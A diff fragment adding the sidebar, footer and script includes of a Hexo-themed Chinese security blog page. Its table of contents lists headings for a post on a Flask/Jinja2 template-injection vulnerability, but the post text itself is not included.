+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flask"><span class="nav-number">1.1.</span> <span class="nav-text">flask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Jinja-2"><span class="nav-number">1.2.</span> <span class="nav-text">Jinja 2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8python%E7%89%B9%E6%80%A7%E9%80%83%E9%80%B8"><span class="nav-number">4.2.</span> <span class="nav-text">利用python特性逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.3.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="nav-number">4.4.</span> <span class="nav-text">文件操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.5.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="nav-number">4.6.</span> <span class="nav-text">WAF绕过</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">longer</p>
+  <div class="site-description" itemprop="description">不愿分享小故事的脚本小子成不了心灵骇客！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://dropann.github.io/" title="https:&#x2F;&#x2F;dropann.github.io&#x2F;" rel="noopener" target="_blank">DropAnn</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.ddosi.org/" title="https:&#x2F;&#x2F;www.ddosi.org&#x2F;" rel="noopener" target="_blank">雨苁</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://websec.readthedocs.io/" title="https:&#x2F;&#x2F;websec.readthedocs.io&#x2F;" rel="noopener" target="_blank">WEB安全学习笔记</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">longer</span>
+</div>
+  <div class="powered-by">由 <a href="https://gitee.com/cat-nineteen/blog/raw/master/imgs/guanzhu.png" class="theme-link" rel="noopener" target="_blank">cat-nineteen</a> @ <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">longer</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
